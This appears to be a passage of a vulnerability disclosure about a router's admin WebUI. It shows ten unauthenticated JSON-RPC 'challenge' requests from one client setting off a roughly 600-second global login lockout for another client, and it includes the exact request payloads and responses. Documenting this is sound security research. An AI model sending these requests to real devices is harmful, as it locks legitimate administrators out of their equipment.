Unauthenticated trigger from client A
-------------------------------------
Ten requests:
{"method":"challenge","params":{"username":"attacker"}}

Each request returned:
{"id":null,"jsonrpc":"2.0","error":{"message":"Access denied","code":-32000}}

Cross-client impact
-------------------
Client B then requested a legitimate root challenge:
{"id":null,"jsonrpc":"2.0","error":{"message":"Login fail number over limit","data":{"wait":600},"code":-32003}}

The valid root response for the baseline nonce was computed as:
MD5("root:<temporary-shadow-hash>:3t1RWPKNFCbSkKwgho4D7CAWWN3wduzl")
= 8d0800f709d7659a54821bcf024f20a3

Client B submitted that response:
{"method":"login","params":{"username":"root","hash":"8d0800f709d7659a54821bcf024f20a3"}}

Response:
{"id":null,"jsonrpc":"2.0","error":{"message":"Login fail number over limit","data":{"wait":580},"code":-32003}}

An additional incorrect login response was submitted after the lockout and
before the correctly computed response. It did not create or extend the
lockout: the lockout had already been observed at 600 seconds after the ten
challenge requests, and the later valid-response result showed 580 seconds
remaining.

Conclusion
----------
Confirmed in native end-to-end HTTP emulation: ten unauthenticated requests
from one network client impose a process-global authentication lockout on a
different client for approximately 600 seconds. The affected service is the
administrative WebUI authentication plane. This is not evidence of a
whole-router forwarding DoS or unauthenticated RCE.
